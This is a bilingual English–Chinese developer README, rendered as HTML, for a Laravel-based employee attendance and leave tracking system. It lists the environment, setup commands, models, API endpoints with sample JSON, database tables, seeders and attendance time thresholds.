&lt;li&gt;13.3. &lt;a href=&quot;#ChangeServerTimezone&quot;&gt;Change Server Timezone&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;#SourceCoderewrite&quot;&gt;Source Code rewrite&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;14.1. &lt;a href=&quot;#modalposition&quot;&gt;modal position&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;14.2. &lt;a href=&quot;#positionmethod&quot;&gt;positionmethod&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;#Web-viewLayoutsDesign&quot;&gt;Web-view Layouts Design&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;15.1. &lt;a href=&quot;#generalpage&quot;&gt;general page&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;15.2. &lt;a href=&quot;#graphpage&quot;&gt;graph page&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;15.3. &lt;a href=&quot;#validrecords&quot;&gt;valid records&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;15.4. &lt;a href=&quot;#holidaypageoption&quot;&gt;holiday page(option)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;15.5. &lt;a href=&quot;#timeeditpage&quot;&gt;timeedit page&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;!-- vscode-markdown-toc-config&lt;br /&gt;
    numbering=true&lt;br /&gt;
    autoSave=true&lt;br /&gt;
    /vscode-markdown-toc-config --&gt;&lt;br /&gt;
&lt;!-- /vscode-markdown-toc --&gt;&lt;/p&gt;
&lt;h1&gt;Runtime Enviornment&lt;/h1&gt;
&lt;p&gt;运行环境&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;Enviornment&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;Version&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;Laravel&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;5.4&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;PHP&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;7.0.10&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;MySQL&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;5.7.17&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;Nginx&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;1.11.9&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;1. &lt;a name='Initialize'&gt;&lt;/a&gt;Initialize&lt;/h2&gt;
&lt;p&gt;系统初始化&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;php artisan key:generate
php artisan make:auth
php artisan migrate
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;2. &lt;a name='MySQLauthentication'&gt;&lt;/a&gt;MySQL authentication&lt;/h2&gt;
&lt;blockquote&gt;&lt;p&gt;
  account: &lt;code&gt;**&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;  password: &lt;code&gt;**&lt;/code&gt;
&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;remote database:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;IP: &lt;code&gt;**.**.**.**:**&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Account: &lt;code&gt;**&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Password: &lt;code&gt;**&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Service Logic&lt;/h1&gt;
&lt;p&gt;业务逻辑&lt;/p&gt;
&lt;h2&gt;3. &lt;a name='Model'&gt;&lt;/a&gt;Model&lt;/h2&gt;
&lt;p&gt;模型&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;User&lt;/li&gt;
&lt;li&gt;Employee&lt;/li&gt;
&lt;li&gt;Record (For employees)&lt;/li&gt;
&lt;li&gt;ActionRecord (For admins)&lt;/li&gt;
&lt;li&gt;CarRecord&lt;/li&gt;
&lt;li&gt;CardRecord&lt;/li&gt;
&lt;li&gt;TimeNode&lt;/li&gt;
&lt;li&gt;DailyCheckStatus&lt;/li&gt;
&lt;li&gt;HolidayDate&lt;/li&gt;
&lt;li&gt;AbsenceValidRecord&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;3.1. &lt;a name='ModelRelationship'&gt;&lt;/a&gt;Model Relationship&lt;/h3&gt;
&lt;p&gt;模型间关系&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;$user-&gt;actions; // 返回某个指定管理员操作记录
$actions-&gt;user; // 返回某条指定记录的管理员信息

$employee-&gt;records; // 返回某个指定雇员的签到记录
$employee-&gt;special_records(); // 以数组返回某个指定雇员的重要签到记录
$employee-&gt;month_report_data(); // 以数组返回某个指定雇员的月记录数据

$record-&gt;employee; // 返回某条指定签到记录的雇员信息

$absenceValidRecord-&gt;employee;// 返回某条指定请假记录的雇员信息
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;4. &lt;a name='Controller'&gt;&lt;/a&gt;Controller&lt;/h2&gt;
&lt;p&gt;控制器&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Controller&lt;/li&gt;
&lt;li&gt;IndexController&lt;/li&gt;
&lt;li&gt;HomeController&lt;/li&gt;
&lt;li&gt;RouteController&lt;/li&gt;
&lt;li&gt;EmployeeController&lt;/li&gt;
&lt;li&gt;RecordController&lt;/li&gt;
&lt;li&gt;TimeNodeController&lt;/li&gt;
&lt;li&gt;ActionRecordController&lt;/li&gt;
&lt;li&gt;AbsenceValidRecordController&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Auth&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;RegisterController&lt;/li&gt;
&lt;li&gt;LoginController&lt;/li&gt;
&lt;li&gt;ForgetPasswordController&lt;/li&gt;
&lt;li&gt;ResetPasswordController&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;5. &lt;a name='Middleware'&gt;&lt;/a&gt;Middleware&lt;/h2&gt;
&lt;p&gt;中间件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;EncryptCookies&lt;/li&gt;
&lt;li&gt;RedirectIfAuthenticated&lt;/li&gt;
&lt;li&gt;TrimStrings&lt;/li&gt;
&lt;li&gt;VerifyCsrfToken&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Listener&lt;/h2&gt;
&lt;p&gt;监听器&lt;/p&gt;
&lt;h2&gt;6. &lt;a name='API'&gt;&lt;/a&gt;API&lt;/h2&gt;
&lt;p&gt;应用程序接口&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;GET &lt;code&gt;/&lt;/code&gt; : 返回所有记录界面&lt;/li&gt;
&lt;li&gt;POST &lt;code&gt;/&lt;/code&gt; : 返回指定日期内记录界面&lt;br /&gt;
&lt;blockquote&gt;&lt;p&gt;
  请求变量:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;$start_time // 开始时间
$end_time // 结束时间
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;GET &lt;code&gt;/home&lt;/code&gt; : 返回普通管理员登录界面&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;GET &lt;code&gt;/superhome&lt;/code&gt; : 返回超级管理员登录界面&lt;br /&gt;
&lt;!-- - GET &lt;code&gt;/graph&lt;/code&gt; : 返回图表界面&lt;/li&gt;
&lt;li&gt;GET &lt;code&gt;/correct&lt;/code&gt; : 返回数据修正界面&lt;/li&gt;
&lt;li&gt;GET &lt;code&gt;/export&lt;/code&gt; : 返回导出excel界面 --&gt;&lt;/li&gt;
&lt;li&gt;GET &lt;code&gt;/valid&lt;/code&gt; : 返回当日出勤情况界面&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;POST &lt;code&gt;/valid&lt;/code&gt; : 返回指定某个日期的出勤情况界面&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;
  请求变量：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;$date // 请求日期
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;GET &lt;code&gt;/report&lt;/code&gt; : 返回月报表界面&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;POST &lt;code&gt;/report&lt;/code&gt; : 返回某个指定月份的月报表界面&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;
  请求变量：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;$month // 格式为 &quot;YYYY-MM&quot; 的某个指定月份
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;GET &lt;code&gt;/holidays&lt;/code&gt; : 返回假期日历界面&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;GET &lt;code&gt;/holidays/dates&lt;/code&gt; : 请求当前&lt;strong&gt;年&lt;/strong&gt;的假期信息&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;
  返回 &lt;code&gt;JSON&lt;/code&gt; 数据：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;json&quot;&gt;{
    &quot;year&quot;: &quot;2017&quot;,
    &quot;dates&quot;: [
        { &quot;date&quot;: &quot;2017-08-01&quot; },
        { &quot;date&quot;: &quot;2017-08-02&quot; },
        { &quot;date&quot;: &quot;2017-08-03&quot; },
        { &quot;date&quot;: &quot;2017-08-04&quot; },
        { &quot;date&quot;: &quot;2017-08-05&quot; },
        { &quot;date&quot;: &quot;2017-08-06&quot; }
    ]
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;POST &lt;code&gt;/holidays&lt;/code&gt; : 请求指定&lt;strong&gt;月&lt;/strong&gt;的假期信息&lt;br /&gt;
&lt;blockquote&gt;&lt;p&gt;
  请求内容：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;$month = &quot;2017-07&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;  返回 &lt;code&gt;JSON&lt;/code&gt; 数据：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;json&quot;&gt;{
    &quot;month&quot;: &quot;2017-07&quot;,
    &quot;dates&quot;: [
        { &quot;date&quot;: &quot;2017-07-01&quot; },
        { &quot;date&quot;: &quot;2017-07-02&quot; },
        { &quot;date&quot;: &quot;2017-07-03&quot; },
        { &quot;date&quot;: &quot;2017-07-04&quot; },
        { &quot;date&quot;: &quot;2017-07-05&quot; },
        { &quot;date&quot;: &quot;2017-07-06&quot; }
    ]
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;PUT &lt;code&gt;/holidays&lt;/code&gt; : 添加指定&lt;strong&gt;月&lt;/strong&gt;的假期日期&lt;br /&gt;
&lt;blockquote&gt;&lt;p&gt;
  请求变量：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;$month = &quot;2017-08&quot;; // 格式为 YYYY-MM 的月份
$day = &quot;1, 2, 3, 4, 5&quot;; // 以英文逗号分隔的数字（在 1 到 $maxDay 之间）
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;DELETE &lt;code&gt;/holidays&lt;/code&gt; :  删除指定&lt;strong&gt;月&lt;/strong&gt;的假期日期&lt;br /&gt;
&lt;blockquote&gt;&lt;p&gt;
  请求 &lt;code&gt;JSON&lt;/code&gt; 数据：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;$month = &quot;2017-08&quot;; // 格式为 YYYY-MM 的月份
$day = &quot;1, 2, 3, 4, 5&quot;; // 以英文逗号分隔的数字（在 1 到 $maxDay 之间）
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;GET &lt;code&gt;/leave&lt;/code&gt; : 返回请假界面&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;POST &lt;code&gt;/leave&lt;/code&gt; : 请求指定日期的请假信息&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;
  请求变量：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;// Undeterminated
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;PUT &lt;code&gt;/leave&lt;/code&gt; : 添加请假信息&lt;br /&gt;
&lt;blockquote&gt;&lt;p&gt;
  请求变量：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;$start_date = '2017-08-03'; // 起始日期，格式为 YYYY-MM-DD
$end_date = '2017-08-14'; // 结束日期， 格式为 YYYY-MM-DD (包括该日期)
$employee_id = 21; // 雇员唯一 ID 号
$type = '病假'; // 请假类型
$note = '这是一条备注'; // 备注
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;DELETE &lt;code&gt;/leave&lt;/code&gt; : 删除指定请假信息&lt;br /&gt;
&lt;blockquote&gt;&lt;p&gt;
  请求变量：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;$start_date = '2017-08-10'; // 起始日期，格式为 YYYY-MM-DD
$end_date = '2017-08-19'; // 结束日期， 格式为 YYYY-MM-DD (包括该日期)
$employee_id = 21; // 雇员唯一 ID 号
$type = '病假'; // 请假类型
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;GET &lt;code&gt;/timeedit&lt;/code&gt; : 返回有效时间编辑界面&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;PUT &lt;code&gt;/timeedit/update&lt;/code&gt; : 更改出勤时间设置&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;
  请求变量：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;$am_start_['day', 'hour', 'minute', 'second'] // 上班开始时间（时、分、秒）
$am_end_['day', 'hour', 'minute', 'second'] // 上班结束时间（时、分、秒）
$pm_start_['day', 'hour', 'minute', 'second'] // 下午开始时间（时、分、秒）
$pm_end_['day', 'hour', 'minute', 'second'] // 下午结束时间（时、分、秒）
$am_ddl_['day', 'hour', 'minute', 'second'] // 上午上班时间（时、分、秒）
$am_late_ddl_['day', 'hour', 'minute', 'second'] // 上午迟到最晚时间（时、分、秒）
$pm_ddl_['day', 'hour', 'minute', 'second'] // 下午上班时间（时、分、秒）
$pm_early_ddl_['day', 'hour', 'minute', 'second'] // 下午早退最早时间（时、分、秒）
$pm_away_['day', 'hour', 'minute', 'second'] // 下午下班时间（时、分、秒）
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;GET &lt;code&gt;/employees/{work_number}&lt;/code&gt; : 返回某个指定雇员信息&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;PUT &lt;code&gt;/employees/{work_number}/records/{id}&lt;/code&gt; : 更改某个指定雇员的某条指定出勤记录&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;
  请求变量：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;$check_direction // 签到方向
$check_method // 签到方式（car || card || 请假）
$card_gate // 刷卡机器编号（可为空）
$note // 备注
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;GET &lt;code&gt;/admin/actions&lt;/code&gt; : 返回当前管理员操作信息&lt;br /&gt;
&lt;blockquote&gt;&lt;p&gt;
  返回 &lt;code&gt;JSON&lt;/code&gt; 数据：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;json&quot;&gt;{
  &quot;current_page&quot;: 1,
  &quot;data&quot;: [
    {
      &quot;id&quot;: 29,
      &quot;user_id&quot;: 1,
      &quot;action&quot;: &quot;login&quot;,
      &quot;timestamp&quot;: &quot;2017-08-21 08:50:20&quot;
    },
    {
      &quot;id&quot;: 28,
      &quot;user_id&quot;: 1,
      &quot;action&quot;: &quot;logout&quot;,
      &quot;timestamp&quot;: &quot;2017-08-21 08:50:18&quot;
    },
    {
      &quot;id&quot;: 27,
      &quot;user_id&quot;: 1,
      &quot;action&quot;: &quot;login&quot;,
      &quot;timestamp&quot;: &quot;2017-08-21 08:41:59&quot;
    }
  ],
  &quot;from&quot;: 1,
  &quot;last_page&quot;: 2,
  &quot;next_page_url&quot;: &quot;http://homestead.app/admin/actions?page=2&quot;,
  &quot;path&quot;: &quot;http://homestead.app/admin/actions&quot;,
  &quot;per_page&quot;: 15,
  &quot;prev_page_url&quot;: null,
  &quot;to&quot;: 15,
  &quot;total&quot;: 19
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;GET &lt;code&gt;/admin/actions/{id}&lt;/code&gt; (SuperAdmin ONLY): 返回某个指定管理员的操作信息&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;GET &lt;code&gt;/admin/users&lt;/code&gt; (SuperAdmin ONLY): 返回所有管理员信息&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;
  返回 &lt;code&gt;JSON&lt;/code&gt; 数据：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;json&quot;&gt;{
  &quot;current_page&quot;: 1,
  &quot;data&quot;: [
    {
      &quot;id&quot;: 3,
      &quot;name&quot;: &quot;Foxwest&quot;,
      &quot;email&quot;: &quot;foxwest@403forbidden.website&quot;,
      &quot;admin&quot;: 1,
      &quot;phone_number&quot;: &quot;6666666666&quot;,
      &quot;created_at&quot;: &quot;2017-08-02 21:31:24&quot;,
      &quot;updated_at&quot;: &quot;2017-08-02 21:31:24&quot;
    },
    {
      &quot;id&quot;: 1,
      &quot;name&quot;: &quot;TripleZ&quot;,
      &quot;email&quot;: &quot;me@triplez.cn&quot;,
      &quot;admin&quot;: 1,
      &quot;phone_number&quot;: &quot;888888888&quot;,
      &quot;created_at&quot;: &quot;2017-08-02 21:31:24&quot;,
      &quot;updated_at&quot;: &quot;2017-08-02 21:31:24&quot;
    },
    {
      &quot;id&quot;: 2,
      &quot;name&quot;: &quot;test&quot;,
      &quot;email&quot;: &quot;test@triplez.cn&quot;,
      &quot;admin&quot;: 0,
      &quot;phone_number&quot;: &quot;***********&quot;,
      &quot;created_at&quot;: &quot;2017-08-02 21:31:24&quot;,
      &quot;updated_at&quot;: &quot;2017-08-02 21:31:24&quot;
    }
  ],
  &quot;from&quot;: 1,
  &quot;last_page&quot;: 1,
  &quot;next_page_url&quot;: null,
  &quot;path&quot;: &quot;http://homestead.app/admin/users&quot;,
  &quot;per_page&quot;: 15,
  &quot;prev_page_url&quot;: null,
  &quot;to&quot;: 3,
  &quot;total&quot;: 3
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;POST &lt;code&gt;/admin/resetpassword&lt;/code&gt; : 重置管理员密码&lt;br /&gt;
&lt;blockquote&gt;&lt;p&gt;
  请求变量：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;$oldpassword // 旧密码
$password // 新密码
$password_confirmation // 确认密码
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;7. &lt;a name='Databasetables'&gt;&lt;/a&gt;Database tables&lt;/h2&gt;
&lt;p&gt;数据表&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;symbol&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;means&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;&amp;#42;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;primary key&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;^&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;foreign key&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3&gt;7.1. &lt;a name='tablename:employees'&gt;&lt;/a&gt;table name: &lt;code&gt;employees&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;columns:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ID*&lt;/th&gt;
&lt;th&gt;name&lt;/th&gt;
&lt;th&gt;gender&lt;/th&gt;
&lt;th&gt;eamil&lt;/th&gt;
&lt;th&gt;phone_number&lt;/th&gt;
&lt;th&gt;work_title&lt;/th&gt;
&lt;th&gt;department&lt;/th&gt;
&lt;th&gt;car_number&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;TripleZ&lt;/td&gt;
&lt;td&gt;man&lt;/td&gt;
&lt;td&gt;me@triplez.cn&lt;/td&gt;
&lt;td&gt;15240241051&lt;/td&gt;
&lt;td&gt;CEO&lt;/td&gt;
&lt;td&gt;Develop Department&lt;/td&gt;
&lt;td&gt;null&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3&gt;7.2. &lt;a name='tablenames:records'&gt;&lt;/a&gt;table names: &lt;code&gt;records&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;columns:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ID*&lt;/th&gt;
&lt;th&gt;employee_id^&lt;/th&gt;
&lt;th&gt;check_direction(Y/N)&lt;/th&gt;
&lt;th&gt;check_method&lt;/th&gt;
&lt;th&gt;check_time&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;card&lt;/td&gt;
&lt;td&gt;2017-07-21 13:22:13&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;card&lt;/td&gt;
&lt;td&gt;2017-07-21 17:22:13&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;car&lt;/td&gt;
&lt;td&gt;2017-07-22 07:22:13&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;car&lt;/td&gt;
&lt;td&gt;2017-07-22 12:22:13&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3&gt;7.3. &lt;a name='tablename:users'&gt;&lt;/a&gt;table name: &lt;code&gt;users&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;columns:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ID*&lt;/th&gt;
&lt;th&gt;name&lt;/th&gt;
&lt;th&gt;email&lt;/th&gt;
&lt;th&gt;password&lt;/th&gt;
&lt;th&gt;admin(Y/N)&lt;/th&gt;
&lt;th&gt;phone_number&lt;/th&gt;
&lt;th&gt;created_at&lt;/th&gt;
&lt;th&gt;updated_at&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;TripleZ&lt;/td&gt;
&lt;td&gt;me@triplez.cn&lt;/td&gt;
&lt;td&gt;******&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;66666666&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;test&lt;/td&gt;
&lt;td&gt;test@triplez.cn&lt;/td&gt;
&lt;td&gt;******&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;88888888&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3&gt;7.4. &lt;a name='tablename:user_action_records'&gt;&lt;/a&gt;table name: &lt;code&gt;user_action_records&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;columns:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ID*&lt;/th&gt;
&lt;th&gt;user_id^&lt;/th&gt;
&lt;th&gt;action&lt;/th&gt;
&lt;th&gt;timestamp&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;login&lt;/td&gt;
&lt;td&gt;2017-07-23 15:47:35&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;logout&lt;/td&gt;
&lt;td&gt;2017-07-23 15:47:39&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;8. &lt;a name='Migrations'&gt;&lt;/a&gt;Migrations&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;2014_10_12_000000_create_xx_table&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;php artisan migrate:reset
php artisan migrate
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;9. &lt;a name='Seeds'&gt;&lt;/a&gt;Seeds&lt;/h2&gt;
&lt;p&gt;填充假数据&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;UsersTableSeeder&lt;/li&gt;
&lt;li&gt;EmployeeSeeder&lt;/li&gt;
&lt;li&gt;RecordSeeder&lt;/li&gt;
&lt;li&gt;ActionRecordSeeder&lt;/li&gt;
&lt;li&gt;CarRecordSeeder&lt;/li&gt;
&lt;li&gt;CardRecordSeeder&lt;/li&gt;
&lt;li&gt;TimeNodeSeeder&lt;/li&gt;
&lt;li&gt;DailyCheckStatusSeeder&lt;/li&gt;
&lt;li&gt;HolidayDateSeeder&lt;/li&gt;
&lt;li&gt;AbsenceValidRecordSeeder&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;composer dump-autoload
php artisan db:seed
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;记得将需要 seed 的数据在 &lt;code&gt;database/seeds/DatabaseSeeder.php&lt;/code&gt; 中注册。&lt;/p&gt;
&lt;h2&gt;10. &lt;a name='EmployeeStatus'&gt;&lt;/a&gt;Employee Status&lt;/h2&gt;
&lt;p&gt;雇员状态&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;正常&lt;/li&gt;
&lt;li&gt;迟到&lt;/li&gt;
&lt;li&gt;早退&lt;/li&gt;
&lt;li&gt;迟到早退&lt;/li&gt;
&lt;li&gt;缺勤&lt;/li&gt;
&lt;li&gt;事假&lt;/li&gt;
&lt;li&gt;病假&lt;/li&gt;
&lt;li&gt;暂无&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;11. &lt;a name='ImportantTimestamp'&gt;&lt;/a&gt;Important Timestamp&lt;/h2&gt;
&lt;p&gt;重要时间戳&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Global&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;$am_start = `3:00` // 上午记录开始时间
$am_end = `14:00` // 上午记录结束时间
$pm_start = `12:00` // 下午记录开始时间
$pm_end = `+1Day 3:00` // 下午记录结束时间
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;AM&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;$am_ddl = `8:00` // 上午签到最晚时间
$am_late_ddl = `10:00` // 上午签到迟到最晚时间
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;PM&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;$pm_ddl = `14:00` // 下午签到最晚时间
$pm_away = `18:00` // 下午离开最早时间
$pm_early_ddl = `16:00` // 下午离开早退最早时间
&lt;/code&gt;&lt;/pre&gt;
